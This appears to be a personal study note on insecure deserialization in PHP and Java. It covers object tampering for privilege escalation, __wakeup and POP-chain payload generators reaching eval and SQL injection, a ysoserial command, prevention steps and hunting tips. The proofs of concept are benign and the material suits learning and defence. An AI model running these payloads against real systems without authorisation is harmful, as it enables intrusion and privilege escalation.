# Insecure Deserialization

Tags: Done
Status: Done

## Mechanisms

### intro

Serialization and deserialization allow programming languages to
reconstruct identical program objects in different computing environments.

### serialization

when we need to store object in (file , data base) or transfer it through the network we should convert it to simple data for example using Json (javascript object notation)  like ( Int ,string ,etc) because ( the object is complex data) so the conversion process 

called serialization  

### Deserialization

the opposite process of serialization that meaning convert the simple data to object and that process done when the server receive the data  

### when it happens

when the developer trust the serialized data because it is difficult  to read  and unreadable to users 

### Abuse insecure deserialization

it arise when the attacker can manipulate  the serialized object to cause unintended consequences in the program. This can lead to authentication bypasses or even RCE.

### scenario of attack

if an application takes a serialized object from the user and uses the data contained in it to determine who is logged in, a malicious user might be able to tamper with that object and authenticate as someone else. 

If the application uses an unsafe deserialization operation, the malicious user might even be able to embed code snippets in the object and get it executed during deserialization.

## In PHP

When insecure deserialization vulnerabilities occur in PHP, we sometimes call them **PHP object injection vulnerabilities**.

When an application needs to store a PHP object or transfer it over the
network, it calls the PHP function serialize() to pack it up. When the application
needs to use that data, it calls unserialize() to unpack and get the
underlying object.

```php
<?php
class User{
public $username;
public $status;
}
 $user = new User;
 $user->username = 'vickie';
 $user->status = 'not admin';
 echo serialize($user);
?>
//output => O:4:"User":2:{s:8:"username";s:6:"vickie";s:6:"status";s:9:"not admin";}
```

```php
b:THE_BOOLEAN;
i:THE_INTEGER;
d:THE_FLOAT;
s:LENGTH_OF_STRING:"ACTUAL_STRING";
a:NUMBER_OF_ELEMENTS:{ELEMENTS}
O:LENGTH_OF_NAME:"CLASS_NAME":NUMBER_OF_PROPERTIES:{PROPERTIES}
```

### Controlling Variable Values

if the serialized object isn’t encrypted we can create a new object with high privileges 

for example 

```php
<?php
class User{
public $username;public $status;
}
$user = new User;
$user->username = 'vickie';
$user->status = 'not admin';
echo serialize($user);
?>
//O:4:"User":2:{s:8:"username";s:6:"vickie";s:6:"status";s:9:"not admin";}
```

after intercept the request  I can replace the object that  I created  with the old one after ensure 

that I changed the privileges and the string length like the following 

```php
O:4:"User":2:{s:8:"username";s:6:"vickie";s:6:"status";s:5:"admin";}
```

### unserialize() Under the Hood

**magic methods :** methods that have a special properties  so if the serialized object’s class implement a magic method it will have a magic properties like :

- automatically run during certain points of execution
- automatically run during certain conditions are met

***__wakeup() method:*** method is used during instantiation when the program
creates an instance of a class in memory (creates an object)

**what it usually used for ?**

1. reconstruct any resources that the object may have
2. reestablish any database connections that were lost during serialization
3. perform other reinitialization tasks

***unserialize() method:*** it takes the unserialized string which specifies the class and the properties of that object, and uses that data to create a copy of the originally serialized object.

then it searches for the __wakeup() method and executes code in it.

***__destruct() method:*** the method that called when there in no references to the deserialized object exist and it used to clean up  the object 

if a __destruct()method contains code that deletes and cleans up files associated with the object, the attacker might be able to mess with the integrity of the filesystem by controlling the input that passed into those functions.

### Achieving RCE

If I will be able to control the values that passed to  the method that directly execute like ( __wakeup **,** __detruct ) then I can achieve RCE

```php
class Example2
{
private $hook;
function __construct(){
// some PHP code...
}
function __wakeup(){
 if (isset($this->hook)) eval($this->hook); //The eval() function evaluates a string as PHP code
}
}
// some PHP code...
$user_data = unserialize($_COOKIE['data']);
```

 exploit it by set my data cookie to serialized and set  the RCE command in hook property   

```php
class Example2
{
private $hook = "phpinfo();"; //rce command 
}
print  urlencode(serialize(new Example2));
```

after encoded the above code and passing it into cookies we will get the PHPinfo page of server

and use it as a proof of concept 

so the attack **in detail** is the following 

1. The serialized Example2 object is passed into the program as the data cookie.
2. The program calls unserialize() on the data cookie.
3. Because the data cookie is a serialized Example2 object, unserialize() instantiates a new Example2 object.
4. The unserialize() function sees that the Example2 class has __wakeup() implemented, so __wakeup() is called.
5. The __wakeup() function looks for the object’s $hook property, and if it is not NULL, it runs eval($hook).
6. The $hook property is not NULL, because it is set to phpinfo();, and so eval("phpinfo();") is run.
7. You’ve achieved RCE by executing the arbitrary PHP code you’ve placed
in the data cookie.

### **Using Other Magic Methods**

Unlike __wakeup() and __destruct(), which always get executed if the
object is created,

 **__toString() method :** is invoked only when the object is treated as   a string. It allows a class to decide how it will react when one of its objects is treated as a string.

for example it occur when the object is passed to (print, echo) functions 

**__call() method :** is invoked when ****an undefined method is called.

### RCE Using POP Chains

what if the declared magic methods of the class don’t contain any useful code in terms of exploitation that is the point of using POP chain so

**WHAT IS POP chain**

property-oriented programming (POP) chain is a type of exploit whose name comes from the fact that the attacker controls all of the deserialized object’s properties

**HOW IT WORKS**

POP chains work by stringing bits of code together, called gadgets( borowed from codebase ,to achieve the attacker’s ultimate goal.

POP chains use magic methods as their initial gadget. Attackers can then use these methods to call other gadgets

for example 

```php
class Example
{
	private $obj;
function __construct()
{
// some PHP code...
}
function __wakeup()
{
 if (isset($this->obj)) return $this->obj->evaluate();
}
}
class CodeSnippet
{
	 private $code;
	 function evaluate()
{
		eval($this->code);
}
}
// some PHP code...
  $user_data = unserialize($_POST['data']);
// some PHP code...
```

the last line contains an insecure deserialization vulnerability, an
attacker can use the following code to generate a serialized object:

```php
class CodeSnippet
{
private $code = "phpinfo();";
}
class Example
{
private $obj;
function __construct()
{
$this->obj = new CodeSnippet;
}
}
print urlencode(serialize(new Example));
```

after the attacker feed the generated string into the POST parameter data the program 

behavior will be the following

1. it will unserialize the object and create an Example instance
2. since Example implements __wakeup(), the program will call __wakeup()
3. see that the obj property is set to a CodeSnippet instance 
4. it will call the evaluate() method of the obj, which runs eval("phpinfo();"),

### SQLi Using POP Chains

notice the magic function below(__tostring)

```php
class Example3
{
protected $obj;
function __construct()
{
// some PHP code...
}
 function __toString()
{
if (isset($this->obj)) return $this->obj->getValue();
}
}
// some PHP code...
$user_data = unserialize($_POST['data']);
// some PHP code...
```

when an Example3 instance is treated as a string, it will return the
result of the getValue() method run on its $obj property.
Let’s also say that, somewhere in the application, the code defines the
class SQL_Row_Value. It has a method named getValue(), which executes a SQL
query. The SQL query takes input from the $_table property of the SQL_Row
_Value instance like the code below

```php
class SQL_Row_Value
{
private $_table;
// some PHP code...
function getValue($id)
{
$sql = "SELECT * FROM {$this->_table} WHERE id = " . (int)$id;
$result = mysql_query($sql, $DBFactory::getConnection());
$row = mysql_fetch_assoc($result);
return $row['value'];
}
}
```

so the  attacker can achieve SQL injection by controlling the $obj in Example3:

```php
class SQL_Row_Value
{
private $_table = "SQL Injection";
}
class Example3
{
protected $obj;
function __construct()
{
$this->obj = new SQL_Row_Value;
}
}
print urlencode(serialize(new Example3));
```

as result the attack will be

1. when attacker’s Example3 instance is treated as a string
2. its $obj’s get_Value() method will be executed
3. then the SQL _Row_Value’s get_Value() method will be executed with the $_table string set
to "SQL Injection".
4. so the attacker can control the string passed into the SQL query SELECT * FROM {$this->_table} WHERE id = " . (int)$id;

---

## In Java

For Java objects to be serializable, their classes must implement the
java.io.Serializable interface. These classes also implement special methods,
writeObject() and readObject(), to handle the serialization and deserialization,

```php
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.Serializable;
import java.io.IOException;
 class User implements Serializable{
 public String username;
}
public class SerializeTest{
public static void main(String args[]) throws Exception{
 User newUser = new User();
 newUser.username = "vickie";
FileOutputStream fos = new FileOutputStream("object.ser");
ObjectOutputStream os = new ObjectOutputStream(fos);
 os.writeObject(newUser); ////
os.close();
FileInputStream is = new FileInputStream("object.ser");
ObjectInputStream ois = new ObjectInputStream(is);
User storedUser = (User)ois.readObject(); ////
System.out.println(storedUser.username);
ois.close();
}
}
```

when

 **os.writeObject(newUser) :** serialization operatio**n**

**(User)ois.readObject();  :** deserialization operation

so to exploit that code we should find an entry point !!

Notice!   

In Java applications, serializable objects are often used to transport
data in HTTP headers, parameters, or cookies , and it are not human readable like PHP serialized strings, But they do have a couple signatures that can help us recognize them like 

- Starts with AC ED 00 05 in hex or rO0 in base64. (You might see these within HTTP requests as cookies or parameters.)
- The Content-Type header of an HTTP message is set to application/xjava-serialized-object.

**After** you discover a user-supplied serialized object we will try to tamper with the 

request information so if java object sent in cookies i could try 

 

- change the usernames, role names, and other identity markers that are present in the object
    
    re-serialize it, and relay it back to the application
    
- tampering with any sort of value in the object that is a file path, file specifier, or control flow value to see if I can alter the program’s flow.

### Achieving RCE

The path from a Java deserialization bug to RCE can be convoluted. To
gain code execution, you often need to use a series of gadgets to reach
the desired method for code execution ,like using pop chain in PHP

so

1. find gadgets in the libraries loaded by the application
2. Using gadgets that are in the application’s scope
3. create a chain of method invocations that eventually leads to RCE

for saving time try to create  exploit chains by using gadgets in popular libraries, such as the Apache Commons-Collections

### Automating the Exploitation by Using **Ysoserial**

 **Ysoserial : is a tool that you can use to generate payloads that exploit Java insecure deserialization bugs.**

so with it I can create  malicious Java serialized objects that use gadget chains from specified libraries with the command :

```php
$ java -jar ysoserial.jar gadget_chain command_to_execute

// for example
$ java -jar ysoserial.jar CommonsCollections1 calc.exe //to open the calculater 
```

as you’ll have to discover which vulnerable libraries your target application implements. This is where good reconnaissance will help you.

### Prevention

Defending against deserialization vulnerabilities is difficult it based on the programming language, libraries, and serialization format used.

so I will review with you some of solutions 

1. should make sure not to deserialize any data tainted by user input with out proper checks
2. when using deserialization use an allowlist to restrict deserialization to a small number of allowed classes.
3. try to use simple data types, like strings and arrays, instead of objects 
4. keep track of the session state on the server instead of relying on user input for session information
5. keep an eye out for patches and make sure your dependencies are up-to-date to avoid introducing deserialization vulnerabilities via third-party code.
6. Limiting gadgets can be a great layer of defense, by by identifying the commonly vulnerable classes and removing them from the application.

### Hunting for Insecure Deserializatio**n**

**Have an access to source code**

- PHP : search for **unserialize()**
- java : search for **readObject()**
- Python: search for **pickle.loads()**
- Ruby : search for **Marshall.load()**

**Havn’t an  access to source code**

**in PHP**⇒ ****the base64 string it’t like (Tzo0OiJVc2VyIjoyOntzOjg6InVzZX
JuYW1lIjtzOjY6InZpY2tpZSI7czo2OiJzdGF0dXMiO3M6OToibm90IGFkbWluIjt9) 

try to decode it and create the malicios object and encode it again and send in cookies

**in python⇒**  the base64 string it’t like (gASVLgAAAAAAAACMCF9fbWFpbl9
flIwGUGVyc29ulJOUKYGUfZSMBG5hbWWUjAZWaWNraWWUc2Iu)

try to decode it and create the malicios object and encode it again and send in cookies

**in java**⇒ serialized object start withe hex code like (AC ED 00 05) or (rO0) in base64

and pay attention if  **Content-Type header** value =  **application/x-java-serialized-object** 

it indicates that the application is passing information via Java serialized objects.

so at all seeking out features that are prone to deserialization flaws. Look for features that might have to deserialize objects supplied by the user, such as (database inputs, authentication tokens,  and HTML) form parameters. and identify  which the language and try to understand the structure of it then try tampering with object .

### Finding Your First Insecure Deserialization!

1. If you can get access to an application’s source code, search for deserialization functions in source code that accept user input.
2. If you cannot get access to source code, look for large blobs of data passed into an application. These could indicate serialized objects that are encoded.
3. Alternatively, look for features that might have to deserialize objects supplied by the user, such as database inputs, authentication tokens, and HTML form parameters.
4. If the serialized object contains information about the identity of the user, try tampering with the serialized object found and see if you can achieve authentication bypass.
5. See if you can escalate the flaw into a SQL injection or remote code execution. Be extra careful not to cause damage to your target application or server.